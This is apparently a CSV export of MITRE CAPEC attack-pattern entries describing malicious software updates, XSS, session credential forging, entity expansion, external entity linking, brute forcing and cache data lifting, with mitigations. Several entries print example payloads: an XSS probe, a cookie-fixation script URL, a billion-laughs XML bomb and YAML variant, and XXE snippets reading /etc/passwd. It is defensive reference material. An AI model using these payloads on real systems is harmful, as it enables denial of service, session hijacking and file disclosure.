CAPEC-184,Software Integrity Attack,Meta,Draft,"An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.",N/A,N/A,Low,N/A,N/A,N/A,::SKILL:Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.:LEVEL:Medium::,"::Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.::",N/A,N/A,N/A,N/A,::494::,N/A,N/A,https://capec.mitre.org/data/definitions/184.html
CAPEC-185,Malicious Software Download,Standard,Draft,An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.,N/A,N/A,Very High,::NATURE:ChildOf:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:662::,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,::494::,TAXONOMY NAME:ATTACK:ENTRY ID:1105:ENTRY NAME:Ingress Tool Transfer::,N/A,https://capec.mitre.org/data/definitions/185.html
CAPEC-186,Malicious Software Update,Standard,Draft,An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.,N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:184::NATURE:CanFollow:CAPEC ID:98::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users).::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.TECHNIQUE:Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.:TECHNIQUE:Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update:TECHNIQUE:Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.:TECHNIQUE:Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.:TECHNIQUE:Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update.::",N/A,::SKILL:This attack requires advanced cyber capabilities:LEVEL:High::,::Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code.::,N/A,"::SCOPE:Access Control:SCOPE:Availability:SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Access Control Availability Confidentiality Execute Unauthorized Commands Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking.::",::Validate software updates before installing.::,::Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]::,::494::,N/A,"TYPE:Other:NOTE:Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system.::",https://capec.mitre.org/data/definitions/186.html
CAPEC-187,Malicious Automated Software Update via Redirection,Detailed,Draft,"An attacker exploits two layers of weaknesses in server or client software for automated update mechanisms to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:186::,N/A,N/A,N/A,N/A,N/A,::SCOPE:Access Control:SCOPE:Availability:SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands::,N/A,N/A,::494::,TAXONOMY NAME:ATTACK:ENTRY ID:1072:ENTRY NAME:Software Deployment Tools::,N/A,https://capec.mitre.org/data/definitions/187.html
CAPEC-189,Black Box Reverse Engineering,Standard,Draft,"An adversary discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs. Black Box Reverse Engineering also refers to gathering physical side effects of a hardware device, such as electromagnetic radiation or sounds.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:188::,N/A,N/A,N/A,"::Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.::",N/A,N/A,N/A,N/A,::203::1255::1300::,N/A,N/A,https://capec.mitre.org/data/definitions/189.html
CAPEC-19,Embedding Scripts within Scripts,Standard,Stable,An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:242::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Exploit:DESCRIPTION:[Steal session IDs, credentials, page content, etc.] As the adversary succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the adversary.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Forceful browsing] When the adversary targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:[Content spoofing] By manipulating the content, the adversary targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes adversary-modified invalid information to the user on the current web page.::","::Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.::","::SKILL:To load malicious script into open, e.g. world writable directory:LEVEL:Low::SKILL:Executing remote scripts on host and collecting output:LEVEL:Medium::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Use browser technologies that do not allow client side scripting.::Utilize strict type, character, and encoding enforcement.::Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all remote content.::Perform output validation for all remote content.::Disable scripting languages such as JavaScript in browser::Session tokens for specific host::Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode::","::Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an adversary may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many adversarys take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the adversary to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.::~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.::",::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1546.004:ENTRY NAME:Event Triggered Execution:.bash_profile and .bashrc::,N/A,https://capec.mitre.org/data/definitions/19.html
CAPEC-191,Read Sensitive Constants Within an Executable,Detailed,Draft,"An adversary engages in activities to discover any sensitive constants present within the compiled code of an executable. These constants may include literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:167::,N/A,::Access to a binary or executable such that it can be analyzed by various utilities.::,N/A,"::Binary analysis programs such as 'strings' or 'grep', or hex editors.::",N/A,N/A,N/A,N/A,::798::,TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials:Credentials in files::,"TYPE:Other:NOTE:More sophisticated methods of searching for sensitive strings within a file involve disassembly or decompiling of the file. One could, for example, utilize disassembly methods on an ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed. Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Disassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as jar are used to extract the compiled class files. Next, a java decompiler such as DJ is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs.::",https://capec.mitre.org/data/definitions/191.html
CAPEC-192,Protocol Analysis,Meta,Stable,"An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network.",N/A,Low,Low,N/A,N/A,::Access to a binary executable.::The ability to observe and interact with a communication channel between communicating processes.::,"::SKILL:Knowlegde of the Open Systems Interconnection model (OSI model), and famililarity with Wireshark or some other packet analyzer.:LEVEL:High::","::Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Successful deciphering of protocol information compromises the confidentiality of future sensitive communications.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Modifying communications after successful deciphering of protocol information compromises integrity.::,N/A,N/A,::326::,N/A,"TYPE:Other:NOTE:There are several challenges inherent to protocol analysis depending upon the nature of the protocol being analyzed. There may also be other types of factors which complicate the process such as encryption or ad hoc obfuscation of the protocol. In general there are two kinds of networking protocols, each associated with its own challenges and analysis approaches or methodologies. Some protocols are human-readable, which is to say they are text-based protocols. Examples of these types of protocols include HTTP, SMTP, and SOAP. Additionally, application-layer protocols can be embedded or encapsulated within human-readable protocols in the data portion of the packet. Typically, human-readable protocol implementations are susceptible to automatic decoding by the appropriate tools, such as Wireshark/ethereal, tcpdump, or similar protocol sniffers or analyzers. The presence of well-known protocol specifications in addition to easily identified protocol delimiters, such as Carriage Return or Line Feed characters (CRLF) result in text-based protocols susceptibility to direct scrutiny through manual processes. Protocol analysis against protocol implementations such as HTTP is often performed to identify idiosyncratic implementations of a protocol by a server or client. In the case of application-layer protocols which are embedded within text-based protocols, analysis techniques typically benefit from the well-known nature of the encapsulating protocols and can focus on discovering the semantic characteristics of the proprietary protocol or API, since the syntax and protocol delimiters of the underlying protocols can be readily identified. When performing protocol analysis of machine-readable (non-text-based) protocols difficulties emerge as the protocol itself was designed to be read by computing process. Such protocols are typically composed entirely in binary with no apparent syntax, grammar, or structural boundaries. Examples of these types of protocols are IP, UDP, and TCP. Binary protocols with published specifications can be automatically decoded by protocol analyzers, but in the case of proprietary, closed-specification, binary protocols there are no immediate indicators of packet syntax such as packet boundaries, delimiters, or structure, or the presence or absence of encryption or obfuscation. In these cases there is no one technology that can extract or reveal the structure of the packet on the wire, so it is necessary to use trial and error approaches while observing application behavior based on systematic mutations introduced at the packet-level. Tools such as Protocol Debug (PDB) or other packet injection suites are often employed. In cases where the binary executable is available, protocol analysis can be augmented with static and dynamic analysis techniques.::",https://capec.mitre.org/data/definitions/192.html
CAPEC-194,Fake the Source of Data,Standard,Stable,"An adversary takes advantage of improper authentication to provide data or services under a falsified identity. The purpose of using the falsified identity may be to prevent traceability of the provided data or to assume the rights granted to another individual. One of the simplest forms of this attack would be the creation of an email message with a modified From field in order to appear that the message was sent from someone other than the actual sender. The root of the attack (in this case the email system) fails to properly authenticate the source and this results in the reader incorrectly performing the instructed action. Results of the attack vary depending on the details of the attack, but common results include privilege escalation, obfuscation of other attacks, and data corruption/manipulation.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:657::NATURE:CanPrecede:CAPEC ID:667::,N/A,"::This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association, there would be no reason to fake the source.::",N/A,"::Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets, specific client software, and tools to capture network traffic. Many variants of this attack require no attacker resources, however.::",N/A,"::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic:NOTE:Integrity Alter Execution Logic By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges:NOTE:Integrity Gain Privileges By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.::SCOPE:IntegrityTECHNICAL IMPACT:Hide Activities:NOTE:Integrity Hide Activities Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.::",N/A,N/A,::287::,TAXONOMY NAME:WASC:ENTRY ID:38:ENTRY NAME:URL Redirector Abuse::,N/A,https://capec.mitre.org/data/definitions/194.html
CAPEC-196,Session Credential Falsification through Forging,Standard,Draft,"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.",N/A,Medium,Medium,::NATURE:CanPrecede:CAPEC ID:384::NATURE:CanPrecede:CAPEC ID:61::NATURE:ChildOf:CAPEC ID:21::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.TECHNIQUE:An attacker makes many anonymous connections and records the session IDs.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.TECHNIQUE:The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.TECHNIQUE:The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim.::",::The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.::,::SKILL:Forge the session credential and reply the request.:LEVEL:Medium::,"::Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.::",N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,"::Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::","::This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.::",::384::664::,N/A,N/A,https://capec.mitre.org/data/definitions/196.html
CAPEC-197,Exponential Data Expansion,Detailed,Draft,"An adversary submits data to a target application which contains nested exponential data expansion to produce excessively large output. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor's CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.",::TERM:Billion Laughs Attack:DESCRIPTION:::TERM:XML Bomb:DESCRIPTION:::TERM:XML Entity Expansion (XEE):DESCRIPTION:::,High,Medium,::NATURE:ChildOf:CAPEC ID:230::,::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using subsitituion on the victim's side.TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious payload] The adversary crafts a malicious message containing nested exponential expansion that completely uses up available server resources. See the Example Instances section for details on how to craft this malicious payload.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::,::This type of attack requires that the target must receive input but either fail to provide an upper limit for entity expansion or provide a limit that is so large that it does not preclude significant resource consumption.::,::SKILL:Ability to craft nested data expansion messages.:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service::,"::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::","::The most common example of this type of attack is the many laughs attack (sometimes called the 'billion laughs' attack). For example: <?xml version=1.0?><!DOCTYPE lolz [<!ENTITY lol lol><!ENTITY lol2 &lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;><!ENTITY lol3 &lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;><!ENTITY lol4 &lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;><!ENTITY lol5 &lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;><!ENTITY lol6 &lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;><!ENTITY lol7 &lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6><!ENTITY lol8 &lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;><!ENTITY lol9 &lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;> ]><lolz>&lol9;</lolz> This is well formed and valid XML according to the DTD. Each entity increases the number entities by a factor of 10. The line of XML containing lol9; expands out exponentially to a message with 10^9 entities. A small message of a few KBs in size can easily be expanded into a few GB of memory in the parser. By including 3 more entities similar to the lol9 entity in the above code to the DTD, the program could expand out over a TB as there will now be 10^12 entities. Depending on the robustness of the target machine, this can lead to resource depletion, application crash, or even the execution of arbitrary code through a buffer overflow.::This example is similar, but uses YAML. This was used to attack Kubernetes [REF-686] a: &a [lol,lol,lol,lol,lol,lol,lol,lol,lol]b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]::",::770::776::,TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::,N/A,https://capec.mitre.org/data/definitions/197.html
CAPEC-20,Encryption Brute Forcing,Standard,Draft,"An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:668::,"::STEP:1:PHASE:Explore:DESCRIPTION:Determine the ciphertext and the encryption algorithm.::STEP:2:PHASE:Experiment:DESCRIPTION:Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.::",::Ciphertext is known.::Encryption algorithm and key size are known.::,::SKILL:Brute forcing encryption does not require much skill.:LEVEL:Low::,"::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge). On average, for a binary key of size N, 2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext. Obviously as N gets large the brute force approach becomes infeasible.::",::None. This attack happens offline.::,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.::In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.::",::In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.::,::326::327::693::1204::,N/A,N/A,https://capec.mitre.org/data/definitions/20.html
CAPEC-201,Serialized Data External Linking,Detailed,Draft,"An adversary creates a serialized data file (e.g. XML, YAML, etc...) that contains an external data reference. Because serialized data parsers may not validate documents with external references, there may be no checks on the nature of the reference in the external data. This can allow an adversary to open arbitrary files or connections, which may further lead to the adversary gaining access to information on the system that they would normally be unable to obtain.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:231::NATURE:ChildOf:CAPEC ID:278::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an adversary records all instances of web services that process requests with serialized data.TECHNIQUE:Use an automated tool to record all instances of URLs that process requests with serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes serialized data requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious data message that contains references to sensitive files.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an External Linking attack] Send the malicious crafted message containing the reference to a sensitive file to the target URL.::",::The target must follow external data references without validating the validity of the reference target.::,::SKILL:To send serialized data messages with maliciously crafted schema.:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Configure the serialized data processor to only retrieve external entities from trusted sources.::,::The following DTD would attempt to open the /dev/tty device: <!DOCTYPE doc [ <!ENTITY ent SYSTEM file:///dev/tty> ]> A malicious actor could use this crafted DTD to reveal sensitive information.::The following XML snippet would attempt to open the /etc/passwd file: <foo xmlns:xi=http://www.w3.org/2001/XInclude> <xi:include parse=text href=file:///etc/passwd/></foo>::,::829::,N/A,N/A,https://capec.mitre.org/data/definitions/201.html
CAPEC-204,Lifting Sensitive Data Embedded in Cache,Detailed,Draft,"An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:167::NATURE:CanPrecede:CAPEC ID:560::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.TECHNIQUE:Use probing tools to look for application cache files on a machine.:TECHNIQUE:Use a web application and determine if any sensitive information is stored in browser cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.TECHNIQUE:Use priviledge escalation to access cache files that might have strict privileges.:TECHNIQUE:If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.TECHNIQUE:Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions.::",::The target application must store sensitive information in a cache.::The cache must be inadequately protected against attacker access.::,N/A,"::The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.::",N/A,N/A,N/A,N/A,::524::311::1239::1258::,N/A,N/A,https://capec.mitre.org/data/definitions/204.html
